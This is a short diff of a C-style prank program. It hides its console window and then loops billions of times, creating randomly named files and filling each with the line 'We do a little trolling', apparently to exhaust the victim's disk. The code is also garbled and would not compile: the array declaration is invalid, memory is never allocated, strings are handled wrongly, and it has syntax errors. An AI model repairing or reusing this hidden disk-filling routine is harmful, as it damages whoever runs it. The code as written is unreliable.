@@ -9,7 +9,8 @@ int main() {
     ShowWindow( hWnd, SW_MINIMIZE );
     ShowWindow( hWnd, SW_HIDE );    
     FILE[] *x;
-    for(int i = 0; i < 10000000000000; i++) {
+    //Number below is used because it is the 32 bit unsigned integer limit
+    for(unsigned int i = 0; i < 4294967295; i++) {
         x[i] = fopen(rand() + '.txt', 'w+')
         for(int y = 0, y < i; y++){
             fputs("We do a little trolling\n", x[i]);
